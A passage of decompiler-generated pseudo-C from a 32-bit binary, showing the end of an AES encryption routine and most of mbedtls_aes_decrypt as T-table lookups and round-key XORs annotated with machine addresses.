    int32_t v65; // 0x8049b9c
    uint32_t v66; // 0x8049baa
    int32_t v67; // 0x8049bad
    int32_t v68; // 0x8049bc1
    int32_t v69; // 0x8049bcd
    int32_t v70; // 0x8049be1
    int32_t v71; // 0x8049bf9
    int32_t v72; // 0x8049c32
    uint32_t v73; // 0x8049c60
    int32_t v74; // 0x8049c03
    int32_t v75; // 0x8049c10
    int32_t v76; // 0x8049c28
    int32_t v77; // 0x8049c39
    int32_t v78; // 0x8049c40
    int32_t v79; // 0x8049c55
    uint32_t v80; // 0x8049c28
    if (v29 < 4) {
        v57 = v28;
        // branch -> 0x8049b62
    } else {
        int32_t v81 = v28;
        int32_t v82 = v30; // 0x8049b49172
        // branch -> 0x8049950
        while (true) {
            int32_t v83 = *(int32_t *)(4 * (v11 % 256) + 0x8082500); // 0x8049959
            int32_t v84 = *(int32_t *)(4 * v27 / 0x1000000 + 0x8083100); // 0x8049960
            int32_t v85 = *(int32_t *)(4 * (v15 / 256 % 256) + 0x8082900); // 0x8049973
            int32_t v86 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8082d00); // 0x8049987
            uint32_t v87 = v86 ^ v85 ^ *(int32_t *)v81 ^ v84 ^ v83; // 0x8049991
            int32_t v88 = *(int32_t *)(4 * (v15 % 256) + 0x8082500); // 0x8049999
            int32_t v89 = *(int32_t *)(4 * v11 / 0x1000000 + 0x8083100); // 0x80499a3
            int32_t v90 = *(int32_t *)(v81 + 4); // 0x80499b2
            int32_t v91 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8082900); // 0x80499b7
            int32_t v92 = *(int32_t *)(4 * (v27 / 0x10000 % 256) + 0x8082d00); // 0x80499cb
            int32_t v93 = *(int32_t *)(4 * (v23 % 256) + 0x8082500); // 0x80499d5
            uint32_t v94 = v92 ^ v91 ^ v90 ^ v89 ^ v88; // 0x80499df
            int32_t v95 = *(int32_t *)(4 * v15 / 0x1000000 + 0x8083100); // 0x80499e6
            uint32_t v96 = v27; // 0x80499ed
            int32_t v97 = *(int32_t *)(4 * (v96 % 256) + 0x8082500); // 0x80499f9
            int32_t v98 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8083100); // 0x8049a0b
            uint32_t v99 = v11; // 0x8049a12
            int32_t v100 = *(int32_t *)(v81 + 8); // 0x8049a15
            int32_t v101 = *(int32_t *)(4 * (v96 / 256 % 256) + 0x8082900); // 0x8049a18
            int32_t v102 = *(int32_t *)(v81 + 12); // 0x8049a22
            int32_t v103 = *(int32_t *)(4 * (v99 / 256 % 256) + 0x8082900); // 0x8049a28
            int32_t v104 = *(int32_t *)(4 * (v15 / 0x10000 % 256) + 0x8082d00); // 0x8049a2f
            uint32_t v105 = v104 ^ v103 ^ v102 ^ v98 ^ v97; // 0x8049a2f
            int32_t v106 = *(int32_t *)(4 * (v99 / 0x10000 % 256) + 0x8082d00); // 0x8049a48
            uint32_t v107 = v106 ^ v101 ^ v100 ^ v95 ^ v93; // 0x8049a48
            int32_t v108 = *(int32_t *)(4 * (v87 % 256) + 0x8082500); // 0x8049a52
            int32_t v109 = *(int32_t *)(4 * v105 / 0x1000000 + 0x8083100); // 0x8049a59
            int32_t v110 = v109 ^ v108 ^ *(int32_t *)(v81 + 16); // 0x8049a65
            int32_t v111 = *(int32_t *)(4 * (v94 / 256 % 256) + 0x8082900); // 0x8049a70
            int32_t v112 = *(int32_t *)(4 * (v107 / 0x10000 % 256) + 0x8082d00); // 0x8049a81
            int32_t v113 = *(int32_t *)(4 * (v94 % 256) + 0x8082500); // 0x8049a8e
            v11 = v110 ^ v111 ^ v112;
            int32_t v114 = *(int32_t *)(4 * v87 / 0x1000000 + 0x8083100); // 0x8049aa3
            int32_t v115 = *(int32_t *)(v81 + 20); // 0x8049ab0
            int32_t v116 = *(int32_t *)(4 * (v107 / 256 % 256) + 0x8082900); // 0x8049ab6
            int32_t v117 = *(int32_t *)(4 * (v105 / 0x10000 % 256) + 0x8082d00); // 0x8049acb
            int32_t v118 = v117 ^ v116 ^ v115 ^ v114 ^ v113; // 0x8049acb
            int32_t v119 = *(int32_t *)(4 * (v107 % 256) + 0x8082500); // 0x8049ada
            int32_t v120 = *(int32_t *)(4 * v94 / 0x1000000 + 0x8083100); // 0x8049ae4
            int32_t v121 = *(int32_t *)(v81 + 24); // 0x8049af2
            int32_t v122 = *(int32_t *)(4 * (v105 % 256) + 0x8082500); // 0x8049afe
            int32_t v123 = *(int32_t *)(4 * v107 / 0x1000000 + 0x8083100); // 0x8049b05
            int32_t v124 = *(int32_t *)(v81 + 28); // 0x8049b0c
            int32_t v125 = *(int32_t *)(4 * (v105 / 256 % 256) + 0x8082900); // 0x8049b12
            int32_t v126 = *(int32_t *)(4 * (v87 / 256 % 256) + 0x8082900); // 0x8049b1f
            int32_t v127 = *(int32_t *)(4 * (v87 / 0x10000 % 256) + 0x8082d00); // 0x8049b32
            int32_t v128 = v127 ^ v125 ^ v121 ^ v120 ^ v119; // 0x8049b32
            int32_t v129 = *(int32_t *)(4 * (v94 / 0x10000 % 256) + 0x8082d00); // 0x8049b42
            int32_t v130 = v129 ^ v126 ^ v124 ^ v123 ^ v122; // 0x8049b42
            if (v82 == 1) {
                // 0x8049b53
                v23 = v128;
                v27 = v130;
                v57 = 32 * v30 + v28;
                v15 = v118;
                // branch -> 0x8049b62
                // 0x8049b62
                v62 = *(int32_t *)(4 * (v11 % 256) + 0x8082500);
                v63 = *(int32_t *)(4 * v27 / 0x1000000 + 0x8083100);
                v64 = *(int32_t *)(4 * (v15 / 256 % 256) + 0x8082900);
                v65 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8082d00);
                v66 = *(int32_t *)v57 ^ v63 ^ v62 ^ v64 ^ v65;
                v67 = *(int32_t *)(4 * (v15 % 256) + 0x8082500);
                v68 = *(int32_t *)(4 * v11 / 0x1000000 + 0x8083100);
                v69 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8082900);
                v70 = *(int32_t *)(4 * (v27 / 0x10000 % 256) + 0x8082d00);
                v39 = v70 ^ v69 ^ v68 ^ *(int32_t *)(v57 + 4) ^ v67;
                v71 = *(int32_t *)(4 * v15 / 0x1000000 + 0x8083100);
                v74 = *(int32_t *)(4 * (v23 % 256) + 0x8082500);
                v75 = *(int32_t *)(4 * (v27 / 256 % 256) + 0x8082900);
                v76 = *(int32_t *)(4 * (v11 / 0x10000 % 256) + 0x8082d00);
                v80 = v76 ^ v75 ^ *(int32_t *)(v57 + 8) ^ v74 ^ v71;
                v72 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8083100);
                v77 = *(int32_t *)(4 * (v27 % 256) + 0x8082500);
                v78 = *(int32_t *)(4 * (v11 / 256 % 256) + 0x8082900);
                v79 = *(int32_t *)(4 * (v15 / 0x10000 % 256) + 0x8082d00);
                v73 = *(int32_t *)(v57 + 12) ^ v79 ^ v78 ^ v77 ^ v72;
                v56 = *(int32_t *)(v57 + 20);
                v40 = *(char *)(v66 % 256 | 0x8082400);
                v58 = *(int32_t *)(v57 + 16);
                v41 = *(char *)(v73 / 0x1000000 | 0x8082400);
                v42 = *(char *)(v39 / 256 % 256 | 0x8082400);
                v43 = *(char *)(v80 / 0x10000 % 256 | 0x8082400);
                v32 = 0x10000 * (int32_t)v43 ^ 256 * (int32_t)v42 ^ 0x1000000 * (int32_t)v41 ^ v58 ^ (int32_t)v40;
                v44 = *(char *)(v39 % 256 | 0x8082400);
                v45 = *(char *)(v66 / 0x1000000 | 0x8082400);
                v46 = *(char *)(v39 / 0x1000000 | 0x8082400);
                v47 = *(char *)(v80 / 256 % 256 | 0x8082400);
                v48 = *(char *)(v73 / 0x10000 % 256 | 0x8082400);
                v35 = v80;
                v49 = *(char *)(v35 % 256 | 0x8082400);
                v59 = *(int32_t *)(v57 + 24);
                v50 = *(char *)(v73 / 256 % 256 | 0x8082400);
                v51 = *(char *)(v73 % 256 | 0x8082400);
                v52 = *(char *)(v66 / 0x10000 % 256 | 0x8082400);
                v31 = 0x10000 * (int32_t)v52 ^ 256 * (int32_t)v50 ^ v59 ^ (int32_t)v49 ^ 0x1000000 * (int32_t)v46;
                v60 = *(int32_t *)(v57 + 28);
                v53 = *(char *)(v35 / 0x1000000 | 0x8082400);
                v54 = *(char *)(v66 / 256 % 256 | 0x8082400);
                v55 = *(char *)(v39 / 0x10000 % 256 | 0x8082400);
                v27 = 0x10000 * (int32_t)v55 ^ 256 * (int32_t)v54 ^ 0x1000000 * (int32_t)v53 ^ v60 ^ (int32_t)v51;
                v34 = (int32_t)a3;
                *a3 = (char)v32;
                v36 = v32;
                v33 = v34;
                *(char *)(v34 + 1) = (char)(v36 / 256);
                *(char *)(v33 + 2) = (char)(v36 / 0x10000);
                *(char *)(v33 + 3) = (char)(v32 / 0x1000000);
                *(char *)(v33 + 4) = (char)((int32_t)v44 ^ v56);
                *(char *)(v33 + 5) = (char)((256 * (int32_t)v47 ^ v56) / 256);
                *(char *)(v33 + 6) = (char)((0x10000 * (int32_t)v48 ^ v56) / 0x10000);
                *(char *)(v33 + 8) = (char)v31;
                *(char *)(v33 + 12) = (char)v27;
                *(char *)(v33 + 7) = (char)((0x1000000 * (int32_t)v45 ^ v56) / 0x1000000);
                *(char *)(v33 + 9) = (char)(v31 / 256);
                v37 = v31;
                *(char *)(v33 + 11) = (char)(v37 / 0x1000000);
                *(char *)(v33 + 13) = (char)(v27 / 256);
                v38 = v27;
                result = v38 / 0x10000;
                v61 = v38 / 0x1000000;
                g4 = v61;
                *(char *)(v33 + 10) = (char)(v37 / 0x10000);
                *(char *)(v33 + 14) = (char)result;
                *(char *)(v33 + 15) = (char)v61;
                return result;
            }
            // 0x8049950
            v23 = v128;
            v15 = v118;
            v27 = v130;
            v81 += 32;
            v82--;
            // branch -> 0x8049950
        }
    }
    // 0x8049b62
    v62 = *(int32_t *)(4 * (v11 % 256) + 0x8082500);
    v63 = *(int32_t *)(4 * v27 / 0x1000000 + 0x8083100);
    v64 = *(int32_t *)(4 * (v15 / 256 % 256) + 0x8082900);
    v65 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8082d00);
    v66 = *(int32_t *)v57 ^ v63 ^ v62 ^ v64 ^ v65;
    v67 = *(int32_t *)(4 * (v15 % 256) + 0x8082500);
    v68 = *(int32_t *)(4 * v11 / 0x1000000 + 0x8083100);
    v69 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8082900);
    v70 = *(int32_t *)(4 * (v27 / 0x10000 % 256) + 0x8082d00);
    v39 = v70 ^ v69 ^ v68 ^ *(int32_t *)(v57 + 4) ^ v67;
    v71 = *(int32_t *)(4 * v15 / 0x1000000 + 0x8083100);
    v74 = *(int32_t *)(4 * (v23 % 256) + 0x8082500);
    v75 = *(int32_t *)(4 * (v27 / 256 % 256) + 0x8082900);
    v76 = *(int32_t *)(4 * (v11 / 0x10000 % 256) + 0x8082d00);
    v80 = v76 ^ v75 ^ *(int32_t *)(v57 + 8) ^ v74 ^ v71;
    v72 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8083100);
    v77 = *(int32_t *)(4 * (v27 % 256) + 0x8082500);
    v78 = *(int32_t *)(4 * (v11 / 256 % 256) + 0x8082900);
    v79 = *(int32_t *)(4 * (v15 / 0x10000 % 256) + 0x8082d00);
    v73 = *(int32_t *)(v57 + 12) ^ v79 ^ v78 ^ v77 ^ v72;
    v56 = *(int32_t *)(v57 + 20);
    v40 = *(char *)(v66 % 256 | 0x8082400);
    v58 = *(int32_t *)(v57 + 16);
    v41 = *(char *)(v73 / 0x1000000 | 0x8082400);
    v42 = *(char *)(v39 / 256 % 256 | 0x8082400);
    v43 = *(char *)(v80 / 0x10000 % 256 | 0x8082400);
    v32 = 0x10000 * (int32_t)v43 ^ 256 * (int32_t)v42 ^ 0x1000000 * (int32_t)v41 ^ v58 ^ (int32_t)v40;
    v44 = *(char *)(v39 % 256 | 0x8082400);
    v45 = *(char *)(v66 / 0x1000000 | 0x8082400);
    v46 = *(char *)(v39 / 0x1000000 | 0x8082400);
    v47 = *(char *)(v80 / 256 % 256 | 0x8082400);
    v48 = *(char *)(v73 / 0x10000 % 256 | 0x8082400);
    v35 = v80;
    v49 = *(char *)(v35 % 256 | 0x8082400);
    v59 = *(int32_t *)(v57 + 24);
    v50 = *(char *)(v73 / 256 % 256 | 0x8082400);
    v51 = *(char *)(v73 % 256 | 0x8082400);
    v52 = *(char *)(v66 / 0x10000 % 256 | 0x8082400);
    v31 = 0x10000 * (int32_t)v52 ^ 256 * (int32_t)v50 ^ v59 ^ (int32_t)v49 ^ 0x1000000 * (int32_t)v46;
    v60 = *(int32_t *)(v57 + 28);
    v53 = *(char *)(v35 / 0x1000000 | 0x8082400);
    v54 = *(char *)(v66 / 256 % 256 | 0x8082400);
    v55 = *(char *)(v39 / 0x10000 % 256 | 0x8082400);
    v27 = 0x10000 * (int32_t)v55 ^ 256 * (int32_t)v54 ^ 0x1000000 * (int32_t)v53 ^ v60 ^ (int32_t)v51;
    v34 = (int32_t)a3;
    *a3 = (char)v32;
    v36 = v32;
    v33 = v34;
    *(char *)(v34 + 1) = (char)(v36 / 256);
    *(char *)(v33 + 2) = (char)(v36 / 0x10000);
    *(char *)(v33 + 3) = (char)(v32 / 0x1000000);
    *(char *)(v33 + 4) = (char)((int32_t)v44 ^ v56);
    *(char *)(v33 + 5) = (char)((256 * (int32_t)v47 ^ v56) / 256);
    *(char *)(v33 + 6) = (char)((0x10000 * (int32_t)v48 ^ v56) / 0x10000);
    *(char *)(v33 + 8) = (char)v31;
    *(char *)(v33 + 12) = (char)v27;
    *(char *)(v33 + 7) = (char)((0x1000000 * (int32_t)v45 ^ v56) / 0x1000000);
    *(char *)(v33 + 9) = (char)(v31 / 256);
    v37 = v31;
    *(char *)(v33 + 11) = (char)(v37 / 0x1000000);
    *(char *)(v33 + 13) = (char)(v27 / 256);
    v38 = v27;
    result = v38 / 0x10000;
    v61 = v38 / 0x1000000;
    g4 = v61;
    *(char *)(v33 + 10) = (char)(v37 / 0x10000);
    *(char *)(v33 + 14) = (char)result;
    *(char *)(v33 + 15) = (char)v61;
    return result;
}

// Address range: 0x8049e10 - 0x804a3b5
int32_t mbedtls_aes_decrypt(int32_t * a1, char * a2, char * a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = *(int32_t *)(v1 + 4); // 0x8049e1f
    unsigned char v4 = *(char *)(v2 + 1); // 0x8049e25
    unsigned char v5 = *(char *)(v2 + 2); // 0x8049e29
    unsigned char v6 = *(char *)(v2 + 5); // 0x8049e30
    unsigned char v7 = *a2; // 0x8049e3f
    int32_t v8 = *(int32_t *)(v3 + 4); // 0x8049e45
    unsigned char v9 = *(char *)(v2 + 3); // 0x8049e4a
    int32_t v10 = *(int32_t *)v3; // 0x8049e56
    int32_t v11 = (0x1000000 * (int32_t)v9 | (int32_t)v7 | 0x10000 * (int32_t)v5 | 256 * (int32_t)v4) ^ v10; // ebx
    unsigned char v12 = *(char *)(v2 + 6); // 0x8049e58
    unsigned char v13 = *(char *)(v2 + 4); // 0x8049e61
    unsigned char v14 = *(char *)(v2 + 7); // 0x8049e67
    int32_t v15 = (0x1000000 * (int32_t)v14 | (int32_t)v13 | 0x10000 * (int32_t)v12 | 256 * (int32_t)v6) ^ v8; // 0x8049e70
    unsigned char v16 = *(char *)(v2 + 9); // 0x8049e75
    unsigned char v17 = *(char *)(v2 + 10); // 0x8049e79
    unsigned char v18 = *(char *)(v2 + 14); // 0x8049e7d
    unsigned char v19 = *(char *)(v2 + 8); // 0x8049e89
    unsigned char v20 = *(char *)(v2 + 11); // 0x8049e92
    unsigned char v21 = *(char *)(v2 + 13); // 0x8049e9b
    int32_t v22 = *(int32_t *)(v3 + 8); // 0x8049e9f
    int32_t v23 = v22 ^ (0x1000000 * (int32_t)v20 | (int32_t)v19 | 0x10000 * (int32_t)v17 | 256 * (int32_t)v16); // 0x8049e9f
    unsigned char v24 = *(char *)(v2 + 12); // 0x8049ea7
    unsigned char v25 = *(char *)(v2 + 15); // 0x8049eab
    int32_t v26 = *(int32_t *)(v3 + 12); // 0x8049eb6
    int32_t v27 = ((int32_t)v24 | 256 * (int32_t)v21 | 0x10000 * (int32_t)v18 | 0x1000000 * (int32_t)v25) ^ v26; // 0x8049eb6
    int32_t v28 = v3 + 16; // 0x8049eb9
    int32_t v29 = *(int32_t *)v1; // 0x8049ec2
    int32_t v30 = v29 / 2 - 1; // 0x8049ec6
    int32_t v31; // eax
    int32_t v32; // ecx
    int32_t v33; // edi
    int32_t v34; // esi
    int32_t v35;
    uint32_t v36; // 0x804a16b
    uint32_t v37; // 0x804a1be
    uint32_t v38; // 0x804a206
    uint32_t v39; // 0x804a2e5
    uint32_t v40; // 0x804a340
    uint32_t v41; // 0x804a38a
    uint32_t v42; // 0x804a39a
    uint32_t v43; // 0x804a15e
    int32_t v44; // 0x804a11e
    int32_t v45; // 0x804a260
    unsigned char v46; // 0x804a20d
    unsigned char v47; // 0x804a223
    unsigned char v48; // 0x804a232
    unsigned char v49; // 0x804a249
    unsigned char v50; // 0x804a26d
    unsigned char v51; // 0x804a277
    unsigned char v52; // 0x804a28c
    unsigned char v53; // 0x804a2ac
    unsigned char v54; // 0x804a2b3
    unsigned char v55; // 0x804a2c4
    unsigned char v56; // 0x804a2d9
    unsigned char v57; // 0x804a2f0
    unsigned char v58; // 0x804a305
    unsigned char v59; // 0x804a314
    unsigned char v60; // 0x804a32c
    uint32_t v61; // 0x804a1dc170
    int32_t v62; // 0x804a21d
    int32_t v63; // 0x804a2fc169
    int32_t v64; // 0x804a21a
    int32_t v65; // 0x804a2cb
    int32_t v66; // 0x804a2ff
    uint32_t result; // 0x804a39f
    int32_t v67; // 0x804a3a2
    int32_t v68; // 0x804a10a
    int32_t v69; // 0x804a140
    int32_t v70; // 0x804a157
    int32_t v71; // 0x804a164
    int32_t v72; // 0x804a179
    uint32_t v73; // 0x804a18e
    int32_t v74; // 0x804a194
    int32_t v75; // 0x804a19e
    int32_t v76; // 0x804a1b7
    int32_t v77; // 0x804a1cc
    uint32_t v78; // 0x804a1d9
    int32_t v79; // 0x804a1df
    uint32_t v80; // 0x804a217
    uint32_t v81; // 0x804a284
    int32_t v82; // 0x804a114
    int32_t v83; // 0x804a123
    int32_t v84; // 0x804a135
    int32_t v85; // 0x804a1e6
    int32_t v86; // 0x804a1ed
    int32_t v87; // 0x804a1ff
    if (v29 < 4) {
        v36 = v27;
        v43 = v11;
        v61 = v15;
        v63 = v28;
        // branch -> 0x804a104
    } else {
        // 0x8049ed7
        v31 = v15;
        int32_t v88 = v11; // bp-52
        uint32_t v89 = v11; // 0x8049f41
        int32_t v90 = v28;
        int32_t v91 = v30; // 0x804a0eb171
        // branch -> 0x8049ee0
        while (true) {
            int32_t v92 = *(int32_t *)(4 * (v89 % 256) + 0x8083600); // 0x8049eec
            int32_t v93 = *(int32_t *)(4 * v15 / 0x1000000 + 0x8084200); // 0x8049ef3
            int32_t v94 = *(int32_t *)v90; // 0x8049efd
            int32_t v95 = *(int32_t *)(4 * (v27 / 256 % 256) + 0x8083a00); // 0x8049f01
            int32_t v96 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8083e00); // 0x8049f13
            v34 = v96 ^ v95 ^ v94 ^ v93 ^ v92;
            int32_t v97 = *(int32_t *)(4 * (v15 % 256) + 0x8083600); // 0x8049f23
            int32_t v98 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8084200); // 0x8049f2d
            int32_t v99 = *(int32_t *)(v90 + 4); // 0x8049f39
            int32_t v100 = *(int32_t *)(4 * (v89 / 256 % 256) + 0x8083a00); // 0x8049f47
            int32_t v101 = *(int32_t *)(4 * (v27 / 0x10000 % 256) + 0x8083e00); // 0x8049f5c
            uint32_t v102 = v99 ^ v98 ^ v97 ^ v100 ^ v101; // 0x8049f69
            int32_t v103 = *(int32_t *)(4 * (v23 % 256) + 0x8083600); // 0x8049f7a
            int32_t v104 = *(int32_t *)(4 * v27 / 0x1000000 + 0x8084200); // 0x8049f84
            int32_t v105 = *(int32_t *)(v90 + 8); // 0x8049f90
            uint32_t v106 = v31; // 0x8049f95
            int32_t v107 = *(int32_t *)(4 * (v106 / 256 % 256) + 0x8083a00); // 0x8049f9b
            uint32_t v108 = v88; // 0x8049fa5
            int32_t v109 = *(int32_t *)(4 * (v108 / 0x10000 % 256) + 0x8083e00); // 0x8049fb9
            uint32_t v110 = v107 ^ v105 ^ v104 ^ v103 ^ v109; // 0x8049fc0
            int32_t v111 = *(int32_t *)(4 * (v27 % 256) + 0x8083600); // 0x8049fc9
            int32_t v112 = *(int32_t *)(4 * v108 / 0x1000000 + 0x8084200); // 0x8049fd3
            int32_t v113 = *(int32_t *)(v90 + 12); // 0x8049fda
            int32_t v114 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8083a00); // 0x8049fdd
            int32_t v115 = *(int32_t *)(4 * (v106 / 0x10000 % 256) + 0x8083e00); // 0x8049fe7
            uint32_t v116 = v115 ^ v114 ^ v113 ^ v112 ^ v111; // 0x8049fe7
            uint32_t v117 = v34; // 0x8049fee
            int32_t v118 = *(int32_t *)(4 * (v117 % 256) + 0x8083600); // 0x8049ff8
            int32_t v119 = *(int32_t *)(4 * v102 / 0x1000000 + 0x8084200); // 0x804a002
            int32_t v120 = v118 ^ *(int32_t *)(v90 + 16) ^ v119; // 0x804a00b
            int32_t v121 = v120 ^ *(int32_t *)(4 * (v116 / 256 % 256) + 0x8083a00); // 0x804a020
            v88 = v121 ^ *(int32_t *)(4 * (v110 / 0x10000 % 256) + 0x8083e00);
            int32_t v122 = *(int32_t *)(4 * (v102 % 256) + 0x8083600); // 0x804a041
            int32_t v123 = *(int32_t *)(4 * v110 / 0x1000000 + 0x8084200); // 0x804a048
            int32_t v124 = *(int32_t *)(v90 + 20); // 0x804a052
            int32_t v125 = *(int32_t *)(4 * (v117 / 256 % 256) + 0x8083a00); // 0x804a057
            int32_t v126 = *(int32_t *)(4 * (v116 % 256) + 0x8083600); // 0x804a072
            int32_t v127 = *(int32_t *)(4 * (v116 / 0x10000 % 256) + 0x8083e00); // 0x804a079
            int32_t v128 = v127 ^ v125 ^ v124 ^ v123 ^ v122; // 0x804a079
            v31 = v128;
            int32_t v129 = *(int32_t *)(4 * (v110 % 256) + 0x8083600); // 0x804a087
            int32_t v130 = *(int32_t *)(4 * v116 / 0x1000000 + 0x8084200); // 0x804a08e
            int32_t v131 = *(int32_t *)(v90 + 24); // 0x804a098
            int32_t v132 = *(int32_t *)(4 * (v102 / 256 % 256) + 0x8083a00); // 0x804a09e
            uint32_t v133 = v34; // 0x804a0a5
            int32_t v134 = *(int32_t *)(4 * v133 / 0x1000000 + 0x8084200); // 0x804a0ad
            int32_t v135 = *(int32_t *)(4 * (v133 / 0x10000 % 256) + 0x8083e00); // 0x804a0c0
            int32_t v136 = v135 ^ v132 ^ v131 ^ v130 ^ v129; // 0x804a0c0
            int32_t v137 = *(int32_t *)(v90 + 28); // 0x804a0c7
            int32_t v138 = *(int32_t *)(4 * (v110 / 256 % 256) + 0x8083a00); // 0x804a0cd
            int32_t v139 = *(int32_t *)(4 * (v102 / 0x10000 % 256) + 0x8083e00); // 0x804a0e0
            int32_t v140 = v139 ^ v138 ^ v137 ^ v134 ^ v126; // 0x804a0e0
            v32 = v140;
            if (v91 == 1) {
                // 0x804a0f5
                v23 = v136;
                v36 = v140;
                v43 = v88;
                v61 = v128;
                v63 = 32 * v30 + v28;
                // branch -> 0x804a104
                // 0x804a104
                v68 = *(int32_t *)(4 * (v43 % 256) + 0x8083600);
                v82 = *(int32_t *)(4 * v61 / 0x1000000 + 0x8084200);
                v44 = *(int32_t *)v63;
                v83 = *(int32_t *)(4 * (v36 / 256 % 256) + 0x8083a00);
                v84 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8083e00);
                v34 = v84 ^ v83 ^ v44 ^ v82 ^ v68;
                v69 = *(int32_t *)(4 * (v61 % 256) + 0x8083600);
                v70 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8084200);
                v71 = *(int32_t *)(4 * (v43 / 256 % 256) + 0x8083a00);
                v72 = *(int32_t *)(4 * (v36 / 0x10000 % 256) + 0x8083e00);
                v73 = v70 ^ *(int32_t *)(v63 + 4) ^ v69 ^ v71 ^ v72;
                v74 = *(int32_t *)(4 * v36 / 0x1000000 + 0x8084200);
                v75 = *(int32_t *)(4 * (v23 % 256) + 0x8083600);
                v76 = *(int32_t *)(4 * (v61 / 256 % 256) + 0x8083a00);
                v37 = v88;
                v77 = *(int32_t *)(4 * (v37 / 0x10000 % 256) + 0x8083e00);
                v78 = v75 ^ v74 ^ *(int32_t *)(v63 + 8) ^ v76 ^ v77;
                v79 = *(int32_t *)(4 * v37 / 0x1000000 + 0x8084200);
                v85 = *(int32_t *)(4 * (v32 % 256) + 0x8083600);
                v86 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8083a00);
                v87 = *(int32_t *)(4 * (v61 / 0x10000 % 256) + 0x8083e00);
                v38 = v34;
                v46 = *(char *)(v38 % 256 | 0x8083500);
                v80 = *(int32_t *)(v63 + 12) ^ v87 ^ v86 ^ v85 ^ v79;
                v64 = *(int32_t *)(v63 + 16);
                v62 = *(int32_t *)(v63 + 20);
                v47 = *(char *)(v73 / 0x1000000 | 0x8083500);
                v48 = *(char *)(v80 / 256 % 256 | 0x8083500);
                v49 = *(char *)(v78 / 0x10000 % 256 | 0x8083500);
                v11 = 0x10000 * (int32_t)v49 ^ 256 * (int32_t)v48 ^ 0x1000000 * (int32_t)v47 ^ v64 ^ (int32_t)v46;
                v45 = (int32_t)*(char *)(v73 % 256 | 0x8083500) ^ v62;
                v50 = *(char *)(v80 / 0x1000000 | 0x8083500);
                v51 = *(char *)(v78 / 0x1000000 | 0x8083500);
                v81 = 0x1000000 * (int32_t)v51 ^ v45;
                v52 = *(char *)(v38 / 256 % 256 | 0x8083500);
                v53 = *(char *)(v80 % 256 | 0x8083500);
                v54 = *(char *)(v80 / 0x10000 % 256 | 0x8083500);
                v55 = *(char *)(v78 % 256 | 0x8083500);
                v65 = *(int32_t *)(v63 + 24);
                v56 = *(char *)(v73 / 256 % 256 | 0x8083500);
                v39 = v34;
                v57 = *(char *)(v39 / 0x10000 % 256 | 0x8083500);
                v31 = 0x10000 * (int32_t)v57 ^ 256 * (int32_t)v56 ^ v65 ^ (int32_t)v55 ^ 0x1000000 * (int32_t)v50;
                v66 = *(int32_t *)(v63 + 28);
                v58 = *(char *)(v39 / 0x1000000 | 0x8083500);
                v59 = *(char *)(v78 / 256 % 256 | 0x8083500);
                v60 = *(char *)(v73 / 0x10000 % 256 | 0x8083500);
                v32 = 0x10000 * (int32_t)v60 ^ 256 * (int32_t)v59 ^ 0x1000000 * (int32_t)v58 ^ v66 ^ (int32_t)v53;
                v35 = (int32_t)a3;
                *a3 = (char)v11;
                v33 = v35;
                v40 = v11;
                *(char *)(v35 + 1) = (char)(v40 / 256);
                *(char *)(v33 + 2) = (char)(v40 / 0x10000);
                *(char *)(v33 + 3) = (char)(v11 / 0x1000000);
                *(char *)(v33 + 4) = (char)v45;
                *(char *)(v33 + 5) = (char)((256 * (int32_t)v52 ^ v81) / 256);
                *(char *)(v33 + 6) = (char)((0x10000 * (int32_t)v54 ^ v62) / 0x10000);
                *(char *)(v33 + 8) = (char)v31;
                *(char *)(v33 + 12) = (char)v32;
                *(char *)(v33 + 7) = (char)(v81 / 0x1000000);
                *(char *)(v33 + 9) = (char)(v31 / 256);
                v41 = v31;
                *(char *)(v33 + 11) = (char)(v41 / 0x1000000);
                *(char *)(v33 + 13) = (char)(v32 / 256);
                v42 = v32;
                result = v42 / 0x10000;
                v67 = v42 / 0x1000000;
                g4 = v67;
                *(char *)(v33 + 10) = (char)(v41 / 0x10000);
                *(char *)(v33 + 14) = (char)result;
                *(char *)(v33 + 15) = (char)v67;
                return result;
            }
            // 0x8049ee0
            v23 = v136;
            v27 = v140;
            v15 = v128;
            v89 = v88;
            v90 += 32;
            v91--;
            // branch -> 0x8049ee0
        }
    }
    // 0x804a104
    v68 = *(int32_t *)(4 * (v43 % 256) + 0x8083600);
    v82 = *(int32_t *)(4 * v61 / 0x1000000 + 0x8084200);
    v44 = *(int32_t *)v63;
    v83 = *(int32_t *)(4 * (v36 / 256 % 256) + 0x8083a00);
    v84 = *(int32_t *)(4 * (v23 / 0x10000 % 256) + 0x8083e00);
    v34 = v84 ^ v83 ^ v44 ^ v82 ^ v68;
    v69 = *(int32_t *)(4 * (v61 % 256) + 0x8083600);
    v70 = *(int32_t *)(4 * v23 / 0x1000000 + 0x8084200);
    v71 = *(int32_t *)(4 * (v43 / 256 % 256) + 0x8083a00);
    v72 = *(int32_t *)(4 * (v36 / 0x10000 % 256) + 0x8083e00);
    v73 = v70 ^ *(int32_t *)(v63 + 4) ^ v69 ^ v71 ^ v72;
    v74 = *(int32_t *)(4 * v36 / 0x1000000 + 0x8084200);
    v75 = *(int32_t *)(4 * (v23 % 256) + 0x8083600);
    v76 = *(int32_t *)(4 * (v61 / 256 % 256) + 0x8083a00);
    v37 = v11;
    v77 = *(int32_t *)(4 * (v37 / 0x10000 % 256) + 0x8083e00);
    v78 = v75 ^ v74 ^ *(int32_t *)(v63 + 8) ^ v76 ^ v77;
    v79 = *(int32_t *)(4 * v37 / 0x1000000 + 0x8084200);
    v85 = *(int32_t *)(4 * (v27 % 256) + 0x8083600);
    v86 = *(int32_t *)(4 * (v23 / 256 % 256) + 0x8083a00);
    v87 = *(int32_t *)(4 * (v61 / 0x10000 % 256) + 0x8083e00);
    v38 = v34;
    v46 = *(char *)(v38 % 256 | 0x8083500);
